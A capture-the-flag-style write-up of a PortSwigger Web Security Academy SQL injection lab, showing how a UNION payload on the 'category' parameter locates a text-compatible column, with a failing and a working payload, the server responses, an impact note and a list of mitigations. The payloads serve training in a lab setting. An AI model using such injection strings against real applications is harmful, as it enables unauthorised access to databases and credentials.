# SQL Injection - Finding a Column Containing Text

## Lab Information

| Field | Value |
|-------|-------|
| Platform | PortSwigger Web Security Academy |
| Module | SQL Injection |
| Lab | Finding a Column Containing Text |
| Difficulty | Apprentice |
| Status | ✅ Solved |

---

## Objective

Identify which column in the UNION query accepts string (text) values and display the provided random string.

---

## Vulnerability

SQL Injection

Parameter

```
category
```

HTTP Method

```
GET
```

---

## Hint

The lab generated the following random string:

```
YUz0R9
```

---

## Testing Workflow

1. Capture the request using Burp Proxy.
2. Send the request to Repeater.
3. Use the previously discovered 3-column UNION query.
4. Insert a text value into each column one by one.
5. Identify the column that accepts text.
6. Display the provided random string.
7. Solve the lab.

---

## Invalid Payload

```sql
' UNION SELECT 'abcd',NULL,NULL--
```

Response

```
HTTP/2 500 Internal Server Error
```

The first column does not accept text.

---

## Working Payload

```sql
' UNION SELECT NULL,'YUz0R9',NULL--
```

Response

```
HTTP/2 200 OK
```

The second column accepts text and displays the required string.

---

## Result

The lab was successfully solved after displaying the generated string.

---

## Impact

Once an attacker identifies a text-compatible column, sensitive information such as usernames, passwords, database version, or other records can be extracted using UNION-based SQL Injection.

---

## Mitigation

- Prepared Statements
- Parameterized Queries
- Input Validation
- Stored Procedures
- Principle of Least Privilege

---

## Tools Used

- Burp Suite Professional
- Firefox
- PortSwigger Web Security Academy

---

## Status

✅ Lab Solved